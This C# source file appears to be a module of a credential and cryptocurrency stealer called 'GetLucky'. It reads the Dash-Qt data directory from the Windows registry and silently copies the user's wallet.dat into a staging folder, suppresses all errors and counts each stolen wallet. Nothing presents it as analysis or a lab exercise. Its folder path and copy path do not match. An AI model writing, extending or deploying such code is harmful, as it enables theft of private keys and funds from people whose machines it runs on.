﻿using Microsoft.Win32;
using System.IO;

namespace GetLucky
{
    class DashCore
    {
        public static int count = 0;
        public static void DSHcoinStr(string directorypath) 
        {
            try
            {
                using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Dash").OpenSubKey("Dash-Qt"))
                    try
                    {
                        Directory.CreateDirectory(directorypath + "\\Wallets\\DashCore\\");
                        File.Copy(registryKey.GetValue("strDataDir").ToString() + "\\wallet.dat", directorypath + "\\DashCore\\wallet.dat");
                        count++;
                        Wallets.count++;
                    }
                    catch {}
            }
            catch {}
        }
    }
}
